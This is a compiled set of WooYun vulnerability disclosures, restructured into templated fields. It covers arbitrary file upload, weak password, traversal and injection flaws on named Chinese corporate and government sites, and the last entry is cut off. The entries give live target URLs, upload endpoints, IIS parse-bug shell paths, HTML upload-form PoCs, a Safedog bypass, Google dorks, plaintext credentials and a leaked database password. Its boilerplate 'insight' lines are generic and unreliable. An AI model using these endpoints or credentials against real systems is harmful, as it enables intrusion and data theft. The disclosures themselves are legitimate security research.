### [wooyun-2014-069570] 山西卫生考试网上传漏洞
**厂商**: sxwsks.com | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: system_dntb的编辑器没啥可说的。漏洞页面http://www.sxwsks.com/system_dntb/uploadFile.aspx编辑cookie直接上传UserType=0; IsEdition=0; Info=1; uploadFolder=../system_dntb/Upload/;看了下服务器上的信息量挺大的

**POC**: 就装了一个360，提权应该难度不大吧？我就不进内网看了，对这些没有兴趣，主要想混个Wooyun ID学习下http://www.sxwsks.com/wooyun.txt

**绕过**: 直接利用

**修复**: --
---

---
### [wooyun-2015-0162568] 某市政务网任意文件上传漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**:88/swj//FCKeditor/editor/filemanager/browser/default/browser.html?Connector=http%3A%2F%2F**.**.**.**%3A88%2Fswj%2F%2FFCKeditor%2Feditor%2Ffilemanager%2Fconnectors%2Faspx%2Fconnector.aspx

**POC**: http://**.**.**.**:88/swj//FCKeditor/editor/filemanager/browser/default/browser.html?Connector=http%3A%2F%2F**.**.**.**%3A88%2Fswj%2F%2FFCKeditor%2Feditor%2Ffilemanager%2Fconnectors%2Faspx%2Fconnector.aspx

**绕过**: 直接利用

**修复**: 你们比我懂
---

---
### [wooyun-2015-0101265] 台州人才网存在文件上传
**厂商**: 台州人才 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 咯咯~http://www.tzrc.cn/uploadpic.htm

**POC**: 咯咯~

**绕过**: 直接利用

**修复**: 咯咯~ 修修补补又三年
---

---
### [wooyun-2013-026245] 赛迪网 某分站 任意上传
**厂商**: 赛迪网 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.e-xxcs.cn/http://ccidstudy.ccidnet.com/两个同一个站点注册一个会员账号 在个人中心->修改资料 头像上传处可上传任意文件

**POC**: http://www.e-xxcs.cn/http://ccidstudy.ccidnet.com/两个同一个站点

**绕过**: 直接利用

**修复**: .........
---

---
### [wooyun-2015-093256] 武钢集团国际经济贸易总公司目录遍历、越权访问漏洞
**厂商**: 武汉钢铁集团 | **年份**: 2015 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 武钢集团国际经济贸易总公司网站，访问url：http://intl.wisco.com.cn网站 http://intl.wisco.com.cn/cms/app存在目录遍历漏洞，可查看app目录所有文件咯····后台部分模块存在未授权访问，可以进入页面进行操作可以创建广告位咯······用户授权操作模块存在越权访问，可修改多个栏目的编辑权限，地址：http://intl.wisco.com.cn/cms/app/permission/userPreivileges-old.jsp网站根路径暴露了····貌似还存在文件上传，但是没深入尝试了·····

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0145192] 建德市疾病预防控制中心文件上传漏洞
**厂商**: 建德市疾病预防控制中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 可直接上传文件，未深入通过该地址可上传任意文件http://**.**.**.**/admin/ftb.imagegallery.aspx?rif=~/admin/upimage&cif=~/admin/upimage&ftb=free1

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2014-061723] JBR-CMS4.5数据库下载加任意上传
**厂商**: JBR-CMS | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.google关键字inurl:_jbrcms"Powered By:©JBR-CMS Version:V4.5"2.多数网站没有改默认数据库位置，导致数据库可被下载e.g.: www.zjyzkf.com/_jbrcms/%23JbrCMSDB/%23JbrData.mdb密码为md5加密，破解后可进入后台3.后台批量上传存在上传漏洞详见证明

**POC**: 上传漏洞：批量上传POC:<html><body><form action="http://xxx.com/_jbrcms/_News/update.asp?bs=&id=1" method="post"enctype="multipart/form-data"><input type="text" name="Filename" value="1.asp"/><input type="file" name="Filedata" /><br /><input type="submit" name="Upload" value="Submit Query" /></form></body></h

**绕过**: 直接利用

**修复**: 数据库防下载。限制上传文件格式。
---

---
### [wooyun-2014-072554] 畅捷通弱口令及任意文件上传漏洞
**厂商**: 畅捷通 | **年份**: 2014 | **类型**: 后台弱口令

**元思考**: 触发信号: 上传功能

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.chanjet.com/workbench/cardhttp://www.uu.com.cn/user/st#user.st/user.photohttp://dev.chanjet.com/user/000000000000000000031401http://wpzs.chanjet.com/index.html#Setting/photohttp://ccpup.chanjet.com/upindex.html#以上网站都存在弱口令账号密码chanjet好多站点都支持头像等上传我就拿其中一个举例http://www.uu.com.cn/user/st#user.st/user.photo/burpsuite抓包然后直接发到repeater修改文件后缀及文件内容上传php的 要在后缀加空格其他网站我就不深入了

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 1.修改账号密码2.限制文件上传类型
---

---
### [wooyun-2015-096647] Wordpress解压缩路径审查不严可导致恶意插件执行
**厂商**: wordpress | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Wordpress解压缩体系能够识别设备字符、MAC特殊路径等等，但是没有实现对../这样的路径的过滤，使得危险插件可能在尚未激活的情况下，就可以替换网站的关键程序。在WP 3.9.1 下测试通过，用户可以通过WP上传插件，插件文件将解压在wp-content/plugins/XXX目录中。我们可能会认为，zip压缩文件的每个文件，最终都能严格的释放在这个目录中。按照zip的规范，这是成立的。但是，zip包如果精心构造，这就不一定了。举个例子，对于某个插件包，我们将里面的文件baidusubmit/readme.txt，路径修改为../../../../readme.txt，文件名大小能保持一样。上传这个插件包时，Wordpress把readme.txt放到了很高等级的目录，比如，在我服务器public_html，解压后在ftp根目录。FTP根目录Readme.txtPublic_html

**POC**: (见原文)

**绕过**: 直接利用

**修复**: Wordpress 内置的解压类应该针对 ../ 这种符号做处理。
---

---
### [wooyun-2016-0172603] 富士康某系统任意上传漏洞（已拿下服务器）
**厂商**: 富士康科技集团 | **年份**: 2016 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://cssurvey.foxconn.com/admin/study.aspx

**POC**: http://cssurvey.foxconn.com/Templatehttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/1.aspx密码admin

**绕过**: 直接利用

**修复**: 内容未全看，数据量还挺大的。
---

---
### [wooyun-2015-0130184] 中国电信某合作商户业务系统任意文件上传漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国电信某合作商户业务系统任意文件上传漏洞

**POC**: http://www.fjhsh.cn/这是与中国电信合作的商户优惠卷一些活动的平台，此网站可下载优惠卷到指定商户享受打折优惠。http://www.fjhsh.cn/act/filepic.html这里可进行任意格式文件上传直接连SHELL 看看查看下数据库连接文件连上数据库发现业务后台：http://www.fjhsh.cn:81/default.htm在数据库中查找密码，进入后台密码都是明文的，，顺便看下注册用户是多少用户名：admin  密码：aatest123  直接登录后台来看看这个业务平台有哪些功能短信群发功能更改商户优惠促销信息可对APP客户端的内容进行更改可查看到别人优惠卷内

**绕过**: 直接利用

**修复**: 你们懂得。
---

---
### [wooyun-2015-090527] 苏宁某后台绕过任意文件上传
**厂商**: 江苏苏宁易购电子商务有限公司 | **年份**: 2015 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://58.213.19.68/users/sign_in苏宁广场手机客户端后台管理系统http://58.213.19.68/users/sign_up 可以注册账号然后登陆点进入后台是无权限访问的 但是 系统使用rb开发错误信息回显了所有的route

**POC**: 然后就可以照着地图找功能了 完全没有访问限制比如查看所有用户 编辑任意用户可以任意修改发布新闻 奖品 电影 活动 等等等可任意文件上传 可惜脚本不解析 不过html还是可以的http://58.213.19.68/uploads/user/avatar/14893/1.txt

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0153589] 中国中化某分站存在任意文件上传漏洞
**厂商**: 中国中化集团公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中化江苏有限公司http://www.sinochemjiangsu.com/login.aspx发现系统存在fck编辑器于是

**POC**: 发现已成马场，我也上传一个shell，利用iis6解析漏洞一句话地址：http://www.sinochemjiangsu.com/uploads/file/1.asp/33.jpg密码：1在系统内还发现旁站的代码江苏省援外医疗网江苏省卫生国际交流信息管理系统网站http://jsywyl.cn/

**绕过**: 直接利用

**修复**: 删除shell，正确配置fck
---

---
### [wooyun-2011-03312] Sofpro电子政务平台：在线访谈功能存在任意文件上传漏洞
**厂商**: 开普互联 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞文件：/sofprogecslive/live/uploadfile.jsp/sofprogecsinterview/interview/uploadfile.jsp上传中对文件类型采用客户端js验证，本地禁用js，直接上传jsp脚本即可。

**POC**: 教育部网站：http://www.moe.edu.cn/sofprogecslive/live/uploadfile.jsphttp://www.moe.edu.cn/sofprogecsinterview/interview/uploadfile.jsp

**绕过**: 直接利用

**修复**: 建议增加服务端java验证；文件存放目录禁止动态脚本执行；平台系统权限明确，某些后台关键文件禁止未授权访问。
---

---
### [wooyun-2012-016343] 搜狐分站任意文件上传漏洞
**厂商**: 搜狐 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 搜狐分站任意文件上传漏洞

**POC**: 你们懂的

**绕过**: 直接利用

**修复**: 你们比我更专业
---

---
### [wooyun-2012-012898] 多玩某处任意文件上传。
**厂商**: 广州多玩 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://edu.yy.com/agency/auth/applyStep2?agencyType=1上传处。你懂等级较低 原因是对服务器威胁较小。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂的更多
---

---
### [wooyun-2015-0126092] 国华人寿某业务系统漏洞打包
**厂商**: 95549.cn | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 寿险业务系统http://59.151.39.85/pre/1#任意文件上传在扫描该系统的时候，我发现了一个urlhttp://59.151.39.85/prehttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/default.htm点进去好像还可以上传http://59.151.39.85/prehttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/sample1.htm上传成功，但坑爹的是没有回显自己尝试了一下，发现就在当前上传目录http://59.151.39.85/prehttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/wooyun.jpg然后，我试了一下直接上传jsphttp://59.151.39.85/pre

**POC**: 2#任意文件下载http://59.151.39.85/pre/f1print/F1PrintKernelJ1.jsp?&RealPath=/etc/hosts与我之前提交的漏洞WooYun: 国华人寿某系统存在任意文件下载漏洞同一套系统，但不同ip比如http://59.151.39.85/pre/f1print/F1PrintKernelJ1.jsp?&RealPath=/etc/hosts显示的是# Do not remove the following line, or various programs # that require network functionality will

**绕过**: 直接利用

**修复**: 上传点过滤，或者加访问权限，下载过滤../
---

---
### [wooyun-2014-056309] 某通用E-learning管理系统存在任意文件上传漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 新为软件E-learning管理系统,使用的企业挺多的官网列表：http://www.newv.com.cn/fileroot/bos/content/news/case/bgkh/list.htmlg.cn关键词,通过不同的模板名搜索不同企业。inurl:nwc_755_newvexaminurl:nwc_user_cloudinurl:nwc_user_enterprise前提条件是需要登录，但很多企业都存在弱口令，如:test 密码test、123456

**POC**: http://exam.qdgw.edu.cn/customize/nwc_user_newvexam/login/login.html  test 123456http://112.253.20.33:8080/customize/nwc_user_enterprise/login/login.html test test上传地址http://exam.qdgw.edu.cn/user/JEditor/UploadFile.aspx?IsUploadCloud=N&TargetRootPath=notifyReceipt&receiptUid=?删除style="display:none" 

**绕过**: 直接利用

**修复**: 过滤上传
---

---
### [wooyun-2014-087882] 某公文签收系统存在上传漏洞+多处SQL注射
**厂商**: 某公文签收系统 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某公文签收系统存在上传漏洞+多处SQL注射。这几套CMS都存在同一种上传漏洞和SQL注射。1.SQL注射漏洞。出现在 qtlooker.asp  qtdisp.asp  qtlist.asp等文件中，可谷歌搜索：inurl:qtdisp.asp?disp_id=案例如下：http://oa.bzrkjs.gov.cn/qtdisp.asp?disp_id=1522http://www.clhszxx.cn/gwqs/qtdisp.asp?disp_id=1488http://www.84891.com/qtdisp.asp?disp_id=1149http://www.pw8.cn/qtlist.asp?id=17http://www.cjkchina.net/qtlist.asp?id=362http://www.zdct.cn/gwqs/qtlooker.asp?look_id=123

**POC**: 2.存在上传漏洞，配合IIS解析漏洞就可拿到shell。问题存在于in_file.asp文件中，缺陷代码如下：上传漏洞地址：/in_file.asp?file_name=1.asp;1上传后的shell地址：/upfile/1.asp;1.jpg案例如下：http://www.zdct.cn/gwqs//in_file.asp?file_name=1.asp;1http://oa.bzrkjs.gov.cn//in_file.asp?file_name=1.asp;1http://wsbg.nhtyxx.com//in_file.asp?file_name=1.asp;1http://www.

**绕过**: 直接利用

**修复**: 。。。能过吗？
---

---
### [wooyun-2014-060865] 用友某站上传导致2W内部员工账号信息泄露
**厂商**: 用友软件 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 用友U8+开发交流平台:http://u8dev.yonyou.com上传地址：http://u8dev.yonyou.com/default1.aspx上传限制了格式 然后修改上传类型突破上传添加asp后缀后直接传个一句话 然后菜刀连接随后在根目录看到了数据库配置文件value="server=10.10.3.240;uid=sa;pwd=uf*0000;database=u8Kmsns;Pooling=truesa权限，连接数据库查询NT_user表数据:SELECT * FROM NT_user ORDER BY 1 DESC就这样一处小小的上传导致了1W8的内部员工数据泄露。发现大部分都是用友邮箱注册的，那么可以去mail.yonyou.com撞库登录 有可能会得到更多的敏感信息。另外NT_userinfo这个表里有用户的联系方式。

**POC**: 如上。

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-020797] 【盛大180天渗透纪实】第三章.FirstBlood! （某站上传导致服务器沦陷）
**厂商**: 盛大在线 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 经过上次测试后，很长一段时间都没啥进展。。。后来才发现，盛大业务之广超过了大多数网商。这么多业务，IP段一定不止这一点。这次，于是花了半小时，重新更新了一下IP段信息。但仍然没扫描出太多有利用价值的东西。这时，某神经君说：最好调整下思路。比如。。。偏僻一点的端口。。？如81 8000 8001 8080 8081？好吧。。听取了它的建议，添加了这些端口重新进行端口扫描，然后将过滤后的主机导入后台扫描工具扫描敏感信息。。终于，在125.64.2.61:81中发现了fckeditor，并且可以直接访问。版本2.6.3，遍历了下全盘，和上次发现的另一个服务器架构差不多一样。接着进行后台未授权测试，失败。。。这时，一个细节吸引了注意。这个站所对应的上传目录貌似与其它的服务器不同。是不是说明，这站上传文件不是到达up.sdo.com、up2.sdo.com、img.sdg-china.com，而是在

**POC**: (见原文)

**绕过**: 直接利用

**修复**: ·删除本例中涉及的所有网站木马，并进行全盘木马检查。·更改本例中涉及的所有数据库密码。·Fckeditor升级至最新版。
---

---
### [wooyun-2013-045001] 安全狗之文件上传绕过
**厂商**: 安全狗 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 还是看看数据流先network->iis->safedog->asp.dll文件上传流是靠用户自己解析的，所以如果安全狗和asp.dll等扩展解析不一致就可以绕过了------WebKitFormBoundary2smpsxFB3D0KbA7DContent-Disposition: form-data; name="filepath"; filename="a.asp"Content-Type: text/html肯定被拦截------WebKitFormBoundary2smpsxFB3D0KbA7DContent-Disposition: form-data; name="filepath"; filename=a.aspContent-Type: text/html就不拦截鸟

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 加强输入验证
---

---
### [wooyun-2011-03412] 中国红十字基金会目录可访问并且某些页面可以上传木马
**厂商**: 中国红十字基金会 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 危害性极大，你懂的！！可通过目录的某些页面将木马上传

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-066929] 康Q网论坛某程序任意代码写入漏洞
**厂商**: kangq.com | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Discuz!某自带程序存在任意代码写入漏洞Discuz! X 系列产品升级/转换程序，utility\convert\include\global.func.php文件中的save_config_file函数过滤不够严格，导致可写入任意代码至\data\config.inc.php文件。

**POC**: #1 漏洞利用http://bbs.kangq.com/convert/index.php?a=setting&source=d7.2_x1.5不解释上菜刀：eth0      Link encap:Ethernet  HWaddr 5C:F3:FC:B9:7E:0Cinet addr:192.168.0.117  Bcast:192.168.10.255  Mask:255.255.255.0inet6 addr: fe80::5ef3:fcff:feb9:7e0c/64 Scope:LinkUP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1

**绕过**: 直接利用

**修复**: #1 你懂滴
---

---
### [wooyun-2015-0157069] 海尔家居项目综合管理平台
**厂商**: 海尔集团 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 海尔家居项目综合管理平台jboss漏洞，存在漏洞的URL：http://218.58.70.201

**POC**: 开放大量端口直接部署SHELL文件URLhttp://218.58.70.201:8080/myname/ce.jsp 密码xxxxxx开启3389 端口转发登录远程桌面大量用户增加账号提升管理员权限，获取管理员账号密码。

**绕过**: 直接利用

**修复**: 你懂得
---

---
### [wooyun-2013-024641] 瑞意趋势网络口碑管理系统上传漏洞
**厂商**: 瑞意趋势网络口碑管理系统 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: fckeditor编辑器,各个版本都有，包括官方网站。c*.iwom-trends.com***.iwom-trends.comh**.iwom-trends.com

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2013-042039] 深圳航空某站弱口令+某站FCKeditor上传漏洞
**厂商**: 深圳航空 | **年份**: 2013 | **类型**: 后台弱口令

**元思考**: 触发信号: 上传功能

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、http://v2.shenzhenair.com/ 弱口令test/test进入会议时需要输入会议密码，但对输入次数无限制，可爆破，然后进入深航的内部会议。2、biz.shenzhenair.com Fckeditor，可创建文件夹、上传文件等，但无法解析，最好还是升级下编辑器版本

**POC**: 如上

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-098145] 某测评系统#文件上传+一处越权
**厂商**: 学子科技 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 越权案例如下：http://www.anlice.com/ceping/HouAdmin/GLGWUsers.aspxhttp://www.tobdclub.com/ceping/HouAdmin/GLGWUsers.aspxhttp://xt100.cn//ceping/HouAdmin/GLGWUsers.aspxhttp://www.china21nec.com/ceping/HouAdmin/GLGWUsers.aspxhttp://www.gzedu100.com/ceping/HouAdmin/GLGWUsers.aspx1.测试案例:http://www.gzedu100.com/ceping/HouAdmin/GLGWUsers.aspx直接明文密码啊。。2.测试案例:http://www.china21nec.com/ceping/HouAdmin/GLGWUsers.a

**POC**: 1.测试案例:http://xitong.mingjuan.net/ceping/fckeditor/editor/filemanager/connectors/test.htmlhttp://xitong.mingjuan.net/ceping/Uploads/file/1.asp/ccc.jpg1.测试案例:http://www.gzedu100.com/ceping/HouAdmin/GLGWUsers.aspx直接明文密码啊。。2.测试案例:http://www.china21nec.com/ceping/HouAdmin/GLGWUsers.aspx

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-04911] 中软resoft任意文件遍历漏洞
**厂商**: 中软resoft | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入, 上传功能, 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 厂商信息：中软融兴是中软总公司旗下专门从事金融领域软件开发、系统集成、产品代理、技术服务的专业化公司，在行业应用系统开发与服务、自主产品创新研发等方面具有雄厚实力和成熟经验。存在漏洞产品：中软融兴CMS是一套面向金融、政府领域的高端CMS系统，基于j2ee和mysql。漏洞信息：中软融兴CMS列目录与后台上传漏洞。由于未对browser.jsp文件中的webapppath参数进行过滤和指定路径，使得攻击者可以修改并构造相对路径来访问磁盘中其他目录并列出文件。漏洞证明：1、文件遍历修改webappath参数为../或其他。http://www.yjrb.com.cn/cms/common/filechooseold/browser.jsp?webapppath=../htdocs/web/&uploadpath=/

**POC**: 厂商信息：中软融兴是中软总公司旗下专门从事金融领域软件开发、系统集成、产品代理、技术服务的专业化公司，在行业应用系统开发与服务、自主产品创新研发等方面具有雄厚实力和成熟经验。存在漏洞产品：中软融兴CMS是一套面向金融、政府领域的高端CMS系统，基于j2ee和mysql。漏洞信息：中软融兴CMS列目录与后台上传漏洞。由于未对browser.jsp文件中的webapppath参数进行过滤和指定路径，使得攻击者可以修改并构造相对路径来访问磁盘中其他目录并列出文件。漏洞证明：1、文件遍历修改webappath参数为../或其他。http://www.yjrb.com.cn/cms/common/fil

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-066245] TCL商用信息科技（惠州）股份有限公司 成功入侵案件
**厂商**: TCL集团财务有限公司 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.tclbusiness.com/之前因为爆出phpcms 上传漏洞 拿到的 但是现在访问 马子还在 可能漏洞还没被修复

**POC**: 之前因为爆出phpcms 上传漏洞 拿到的 但是现在访问 马子还在 可能漏洞还没被修复

**绕过**: 直接利用

**修复**: 你们懂得
---

---
### [wooyun-2014-056760] 某多省政府在用监测平台存在任意文件上传漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 公司名：北京思路创新科技有限公司搜索：http://www.google.de/#newwindow=1&q=inurl:enterprise-info!getCompanyInfo.action上传成功会自动返回路径。似乎之前我好多洞都没确认为通用……这个总该给确认了吧……

**POC**: 注意返回的路径。有可能需要拼接到自定义的文件夹后面。http://www.xjmic.com/enterprisemonitor/uploadFileings.action<html><form action="http://www.xjmic.com/enterprisemonitor/uploadFileings.action" name="test" method="post" enctype="multipart/form-data"><input type="file" name="fujian" size="23" id="file" /><input type="submit" 

**绕过**: 直接利用

**修复**: 都懂。
---

---
### [wooyun-2015-095776] 宝岛台湾某教育基金会任意文件上传（还有13年的马）
**厂商**: www.seed.org.tw | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.seed.org.tw/这个网站fck 2.4.2编辑器的，版本比较低。http://www.seed.org.tw/fckeditor/editor/dialog/fck_about.htmliis 7.5，诶感觉没戏。上传时候竟然没改名称http://www.seed.org.tw/fckeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/test.html心里有点小激动啊，但是上传小马，菜刀连不了，提示405,直接大马的话，登陆后，啥反应都没有，好奇怪。试了几个都没用。弄个文件上传的小马试试。然后上传大马，直接上传到网站根目录下面这个别人13年的马，被入侵很久啦。

**POC**: 运维人员的安全意识有待提高啊，这么直接备份，感觉很危险啊，如果备份，名称可以改的复杂点不，不然很容易猜测到的，或者不要放网站目录，直接删掉吧

**绕过**: 直接利用

**修复**: 1，fck编辑器，版本有点低啊，升级吧2，记得删除编辑器一些默认上传页面之类3，清理木马吧。fck上传目录有一些，还有网站根目录，其他地方有没有，还望自查。4.运维人员安全意识要增强
---

---
### [wooyun-2014-067660] 南京审计学院某网站注入、任意上传等致使上百名学生个人信息泄露
**厂商**: nau.edu.cn | **年份**: 2014 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

